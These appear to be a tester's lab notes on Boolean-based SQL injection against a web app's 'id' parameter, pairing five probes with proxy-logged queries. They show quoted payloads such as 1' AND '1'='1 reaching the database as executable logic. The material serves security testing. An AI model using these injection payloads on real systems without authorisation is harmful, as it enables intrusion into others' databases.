# N2 ground truth, Sun Nov 15 02:32:32 PM EST 2026
## id=1
<pre>ROWS=1</pre></body>
## id=1 AND 1=1
<pre>INPUT REJECTED</pre>
## id=1'
<pre>INPUT REJECTED</pre>
## id=1' AND '1'='1
<pre>ROWS=1</pre></body>
## id=1' AND '1'='2
<pre>ROWS=0</pre></body>

## N2 SQL seen by the proxy
Source: <path to log file>. Timestamps are UTC (notes headers are EST).
Matched by timestamp to the five N2 probes, in order.

2026-11-15 19:33:06,077844 [INFO] [('172.18.0.5', 48934)] ### SELECT first_name, last_name FROM users WHERE user_id = '1' *#*#Result Set
2026-11-15 19:33:25,768831 [INFO] [('172.18.0.5', 56228)] ### USE db *#*#OK
2026-11-15 19:33:47,515719 [INFO] [('172.18.0.5', 36856)] ### USE db *#*#OK
2026-11-15 19:34:04,583330 [INFO] [('172.18.0.5', 33102)] ### SELECT first_name, last_name FROM users WHERE user_id = '1' AND '1'='1' *#*#Result Set
2026-11-15 19:34:24,202598 [INFO] [('172.18.0.5', 35186)] ### SELECT first_name, last_name FROM users WHERE user_id = '1' AND '1'='2' *#*#Result Set

Observation: both quoted Boolean payloads reached SQL as executable logic. The two rejected probes produced no query.
